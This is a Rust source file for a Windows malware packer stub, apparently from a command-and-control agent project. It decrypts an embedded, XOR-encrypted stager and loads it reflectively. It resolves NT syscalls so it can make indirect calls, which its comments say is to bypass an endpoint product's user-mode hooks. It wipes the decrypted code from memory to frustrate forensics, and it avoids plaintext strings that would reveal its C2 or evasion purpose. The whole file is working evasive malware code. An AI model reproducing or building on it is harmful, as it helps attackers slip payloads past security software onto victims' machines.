//! DM packer stub — decrypts and reflectively loads the embedded stager.
//!
//! This binary contains no agent logic.  It is intentionally small:
//!   - No recognisable Rust PE patterns in .text (the interesting code is encrypted)
//!   - No plaintext strings referencing C2, campaigns, or evasion APIs
//!   - Decryption key and encrypted stager are baked in at compile time
//!
//! Build pipeline (handled by Dockerfile.agent):
//!   1. cargo build --release --bin dm-agent --features "staged-payload,udrl,..."
//!   2. DM_STAGER_PATH=<step1_output> cargo build --release --bin dm-stub \
//!         --features "packer-stub" --target x86_64-pc-windows-gnu
//!   Output: dm-stub.exe  (this file on disk, decryptor only)

#![windows_subsystem = "windows"]
#![allow(unused)]

mod loader;
mod obfs;
mod syscall;

// Encrypted payload: [key: 4 bytes] || [XOR-encrypted stager PE]
// Written by build.rs from DM_STAGER_PATH; placeholder (4 zero bytes) when not set.
static ENCRYPTED: &[u8] = include_bytes!(env!("DM_PACKED_PAYLOAD"));

fn main() {
    // Resolve NT syscall numbers so reflect_pe can use indirect syscalls
    // (bypassing BD's user-mode hooks on NtAllocateVirtualMemory / NtProtectVirtualMemory).
    let _ = unsafe { syscall::init() };

    // Placeholder guard: real payload is always >4 bytes
    if ENCRYPTED.len() <= 4 {
        return;
    }

    let key = [ENCRYPTED[0], ENCRYPTED[1], ENCRYPTED[2], ENCRYPTED[3]];
    let enc = &ENCRYPTED[4..];

    let mut decrypted: Vec<u8> = enc.iter().enumerate()
        .map(|(i, &b)| b ^ key[i % 4])
        .collect();

    #[cfg(target_os = "windows")]
    {
        let entry = unsafe { loader::reflect_pe(&decrypted) };

        // Zero the plaintext before jumping — don't leave the stager's code readable
        // in memory after execution starts
        for b in decrypted.iter_mut() { *b = 0; }
        drop(decrypted);

        if let Ok(ep) = entry {
            let f: unsafe extern "system" fn() = unsafe { core::mem::transmute(ep) };
            unsafe { f() };
        }
    }
}
